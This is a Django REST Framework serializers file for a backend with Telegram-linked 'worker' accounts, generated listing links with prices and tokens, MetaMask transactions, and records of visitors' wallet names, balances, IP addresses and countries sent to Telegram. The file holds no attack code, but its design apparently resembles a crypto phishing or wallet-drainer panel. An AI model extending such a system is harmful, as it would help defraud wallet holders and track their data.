from rest_framework import serializers
from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
from .models import Worker, CreateLink, Chat, ReboundTelegram


class WorkerSerializer(serializers.ModelSerializer):
    class Meta:
        model = Worker
        fields = ['id', 'email', 'password', 'id_telegram']
        extra_kwargs = {'password': {'write_only': True}}

    def create(self, validated_data):
        password = validated_data.pop('password')
        user = Worker(**validated_data)
        user.set_password(password)
        user.save()
        return user


class AuthTokenObtainPairSerializer(TokenObtainPairSerializer):
    @classmethod
    def get_token(cls, user):
        token = super().get_token(user)
        # Включаем ID пользователя в токен
        token['id'] = user.id
        token['id_telegram'] = user.id_telegram
        return token

    def validate(self, attrs):
        data = super().validate(attrs)
        # Включаем ID пользователя в данные ответа
        data['id'] = self.user.id
        data['id_telegram'] = self.user.id_telegram
        return data


class CreateLinkSerializer(serializers.ModelSerializer):
    class Meta:
        model = CreateLink
        fields = [
                  'pk', 'creator', 'collection', 'title',
                  'price', 'link', 'qr', 'slug', 'user_name',
                  'card_name', 'img_link', 'card_description',
                  'card_about', 'contact_address', 'token_id',
                  'exchange', 'custom_token', 'about_img'
                  ]


# MetaMask
class TransactionSerializer(serializers.Serializer):
    to_address = serializers.CharField()
    value = serializers.DecimalField(max_digits=19, decimal_places=18)


class ChatSerializer(serializers.ModelSerializer):
    class Meta:
        model = Chat
        fields = '__all__'


# Telegram test


class TelegramMessageSerializer(serializers.Serializer):
    user_id = serializers.CharField()
    creator_id = serializers.CharField()


class GeneralMessageSerializer(serializers.Serializer):
    creator_id = serializers.CharField()
    chat_id = serializers.CharField()


class ReboundTelegramGeneralSerializer(serializers.ModelSerializer):
    class Meta:
        model = ReboundTelegram
        fields = ("creator", "status", "platform", "wallet", "address", "balance", "ip", "country", "wallet_name")



